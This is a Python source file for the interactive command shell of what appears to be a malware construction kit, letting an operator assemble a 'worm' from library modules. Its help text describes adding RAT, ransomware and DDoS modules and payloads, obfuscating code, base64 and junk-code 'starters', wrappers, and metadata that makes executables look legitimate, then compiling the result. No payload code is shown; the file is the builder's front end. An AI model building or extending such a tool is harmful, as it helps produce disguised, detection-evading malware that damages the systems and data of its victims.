import os
import click
from click_shell import shell
from termcolor import cprint
from time import sleep
from functools import wraps

from app.tools.text_formater import Texter




class QueenShell:
    def __init__(self, main_shell: object, commander: object):
        self.main = main_shell
        self.COM = commander
        self.Queen = self.COM.Queen
        self.Queen.enter()
        self.color_help = "blue"
        self.texter = Texter(25, 100, add_end_line=True)
    
    def exit_queen_shell(self, *args, **kwargs) -> None:
        cprint("[Queen] Exit Queen Shell", "yellow")
    
    def sorter(self, name: str, info: str, cname: str ="blue", cinfo: str = "yellow"):
        sep = 35
        cprint(f"\t{name}", cname, end="")
        cprint(f"{'':{sep - len(name)}}{info}", cinfo)
    
    



    def build(self) -> object:

        @shell(prompt=f"[Queen] >>", intro="------ Welcome To Hive ! Put help for commands list ------- ", on_finished=self.exit_queen_shell)
        def hiveShell() -> None:
            pass

        @hiveShell.command()
        def help() -> None:
            cprint("\n ******************** Hive Help ************************", "yellow")
            self.sorter("clr, clear", "Clear Screen")
            self.sorter("exit", "Exit Hive Shell")
            self.sorter("rebuild", "Clear Worm Constructor. Start Empty Template")
            self.sorter("show [types]", "Display all 'types' items in Library. See 'show --help'")
            self.sorter("name [name]", f"Set Worm name. Actual: {self.Queen.worm.name}")
            self.sorter("add [types] [name]", "Add module to Worm.")
            self.sorter("remove [types] [name]", "Removes module from worm")
            self.sorter('var [name] "[value]"', "Add variable to Worm. See 'var --help'")
            self.sorter("icon [file_name]", "Set icon to executable file")
            self.sorter("worm", "Show worm config. All loaded Modules, Variables etc.")
            self.sorter("comp", "Show all compilers")
            self.sorter("build", "Build ready to use worm")
            self.sorter("install", "Installing the necessary modules for compilation.")
            self.sorter("dlc", "Tool for adding additional modules. See 'dlc --help'")
            self.sorter("sheme", "Displays all 'process items' with diagrams and descriptions.")
            self.sorter("gvar", "Global variables. Changing the compiler, using additional scripts, etc.")
            self.sorter("setgvar", "Add global variable. Sheme: 'set_gvar [name] [value]")
            print("\n\n")
            cprint("---------------------------------------------------------------------------", "yellow")
            cprint("Module Types:", "yellow")
            self.sorter("worm", "Master Templates. Required for all worms")
            self.sorter("module", "Various Modules")
            self.sorter("payload", "payloads")
            self.sorter("starter", "Methods of writing code and starting. For example, converting code to base64")
            self.sorter("shadow", "Code Obfuscation Methods")
            self.sorter("wrapper", "It wraps, puts the worm code into other code. E.g., it puts python code into assembler.")
            self.sorter("process", "The worm's code pipeline. All the steps that will be taken to create the worm. Changing the default can lead to compilation errors.")
            self.sorter("cscript", "Compiler Script. see 'show --help' for more information")
        
        @hiveShell.command()
        def clr() -> None:
            os.system("clear")
        
        @hiveShell.command()
        def clear() -> None:
            os.system("clear")
        
        @hiveShell.command()
        def rebuild():
            self.Queen.clear_worm()
        
        @hiveShell.command()
        @click.argument("types")
        @click.argument("name")
        @click.option("--target", "-t", required=False, help="Indication of a specific place for payload.", default=None)
        def add(types, name, target) -> None:
            if types and name:
                self.Queen.add_worm_item(types, name, target)
        
        @hiveShell.command()
        @click.argument("types")
        @click.argument("name")
        def remove(types, name):
            if types and name:
                self.Queen.worm.remove(types, name)
        
        @hiveShell.command()
        def sheme():
            self.Queen.show_process_list()


        @hiveShell.command()
        @click.argument("name", required=False, default="")
        @click.argument("value", required=False, default="")
        @click.option("--types", "-t", required=False, help="Type of variable. Ex: int, str")
        @click.option("--food", "-f", required=False, is_flag=True, help="Set food to variable. var -f <var_name> <food_name>")
        @click.option("--help", "show_help", is_flag=True, required=False, help="Show help")
        def var(name, value, types, food, show_help):
            if show_help:
                cprint('**** Entering and changing variables. The scheme is: variable_name "value". Ex: PORT "4444" ****', self.color_help)
                cprint('**** Enter values ​​in quotation marks "". This will avoid errors. ****', self.color_help)
                cprint('**** If you want to set the type of a variable use the "-t" option. ****', self.color_help)
                cprint("**** Option: '-f' assigning FOOD variables to regular variables: var -f <variable_name> <FOOD_name> ****", self.color_help)
                cprint("**** ex: var -f data FOOD_UserAgent", self.color_help)
                return
            if not name or not value:
                cprint("Error: 'name' and 'value' are required unless using --help.", "red")
            if food:
                self.Queen.add_food(value, name)
                return
            if not types:
                types = None
            if name and value:
                self.Queen.worm.add_variable(name, value, types)

        @hiveShell.command()
        @click.option("--show", "-s", required=False, is_flag=True, help="Shows available DLC to install.")
        @click.option("--install", "-i", required=False, help="Installing DLC.")
        def dlc(show, install):
            """\nInstalls packages with additional modules. The package must be placed in the 'IN' directory. Instead of the name you can enter '*' which will install all DLCs from the directory."""
            if not show and not install:
                print("Installs packages with additional modules. The package must be placed in the 'IN' directory.\nInstead of the name you can enter '*' which will install all DLCs from the directory.")
            if show:
                self.Queen.show_dlc()
            if install:
                self.Queen.install_DLC(install)

        
        @hiveShell.command()
        @click.argument("types", required=False, default="")
        @click.option("--help", "show_help", is_flag=True, required=False, help="Show help")
        def show(types, show_help) -> None:
            sep = 20
            if show_help:
                hw = self.texter.make_2column("-- worm --", "The worm's main module. Determines what type the worm will be, what it will be used for. This is the first module to be added.")
                cprint(hw, self.color_help)
                hw = self.texter.make_2column("-- module --", "Various modules from which you can build your own worm. Modules that enable communication, malicious modules such as RAT, Ransomware, DDoS, etc. For now, it is only possible to build the worm in python.")
                cprint(hw, self.color_help)
                hw = self.texter.make_2column("-- payload --", "Various PAYLOADs. Written in python, powershell, binary data, etc. They can be added to worms that have payload space.")
                cprint(hw, self.color_help)
                hw = self.texter.make_2column("-- shadow --", "Code obfuscation methods. When you add 'shadow' then the worm code will be shadowed before compilation. It only works on python code.")
                cprint(hw, self.color_help)
                hw = self.texter.make_2column("-- starter --", "This is the final method of modifying the worm's code. You can, for example, convert it to single-line base64 code, you can put the code in a special trigger that will add an additional action. There are also starters that add junk scripts and variables to increase the size of the code or naturally slow down the execution of the main code.")
                cprint(hw, self.color_help)
                hw = self.texter.make_2column("-- cscript --", "(Compile Script) Generates .rc resource script files containing metadata that makes the final executable look more professional. It also allows adding icons and other visual elements. Some modules automatically create and use these scripts, but you can always add or replace them manually.")
                cprint(hw, self.color_help)
                
            
            if types:
                self.Queen.show_items(types)
            
        
        @hiveShell.command()
        @click.option("--types", "-t", required=False, help="Shows all selected module types in worm. Ex: 'worm -t module'")
        def worm(types) -> None:
            if types:
                self.Queen.show_worm_item(types)
            else:
                self.Queen.show_worm()
        
        @hiveShell.command()
        @click.argument("worm_name")
        def name(worm_name):
            if worm_name:
                self.Queen.worm.set_name(worm_name)
        
        @hiveShell.command()
        @click.argument("icon_name")
        def icon(icon_name):
            if icon_name:
                self.Queen.worm.set_icon(icon_name)

        
        @hiveShell.command()
        def comp() -> None:
            self.Queen.show_compilers()     
       
        
        @hiveShell.command()
        @click.option("--no_compile", "-nc", required=False, is_flag=True, help="It does not perform compilation. It only creates a code file.")
        @click.option("--compiler", "-c", required=False, help="Name of the compiler used for compilation")
        @click.option("--payload", "-p", is_flag=True, required=False, help="Build your worm as payload. Put ready module to library")
        def build(no_compile, compiler, payload):
            """\nConstruction and compilation of the worm. If your worm is ready you can compile it. The compilation process takes different amounts of time and depends on the worm code and the compiler you use.
Remember not to use compilers that are not designed for worm language. Nothing good will come out of it."""
            opt = {}
            if no_compile:
                opt["NO_COMPILE"] = True
            if compiler:
                opt["COMPILER_NAME"] = compiler
            if payload:
                opt["PAYLOAD"] = True
            self.Queen.build_worm(opt)
        
        @hiveShell.command()
        @click.option("--install", "-i", required=False, help="Install modules.")
        @click.option("--ext_mod", "-em", required=False, help="Install, update list of additional libraries. If you have added additional libraries, use this option.")
        def install(install, ext_mod) -> None:
            if install:
                self.Queen.master.install(install)
            elif ext_mod:
                self.Queen.master.install_module(ext_mod)
            else:
                print("[QUEEN] List of compilers. To install a compiler add the parameter '-i <compiler_master_name>'. 'Master Compilers' has different compilers.\nBelow is the list of Master Compilers and the compilers installed in them. To install all of them at once type 'install -i all'.\nex: install -i CrossComp")
                self.Queen.master.show_compilers()
        
        @hiveShell.command()
        def gvar():    
            self.Queen.show_global_var()
        
        @hiveShell.command()
        @click.argument("name")
        @click.argument("value")
        def setgvar(name, value):
            """\nSets a global variable. Schema: 'set_gvar [name] [value]'. Ex: 'set_gvar USE_UPX True\n"""
            self.Queen.add_global_var(name, value)
            
        return hiveShell
    
    
    def Run(self) -> None:
        shell = self.build()
        sleep(0.2)
        shell()

            
        